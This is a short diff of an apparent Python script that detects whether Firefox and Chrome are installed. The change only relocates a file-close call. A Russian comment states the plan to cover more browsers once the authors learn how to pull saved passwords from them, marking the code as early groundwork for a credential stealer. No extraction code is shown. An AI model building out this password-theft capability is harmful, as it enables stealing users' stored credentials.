@@ -26,10 +26,10 @@ def scan_apps():
     if fire in text:
         firefox = True
     print(firefox)
-    file.close()
 
     chro = 'Chrome'
     if chro in text:
         chrome = True
     print(chrome)
+    file.close()
 #Нужно добавить еще браузеров, но это после того как узнаем как получить из них пароли
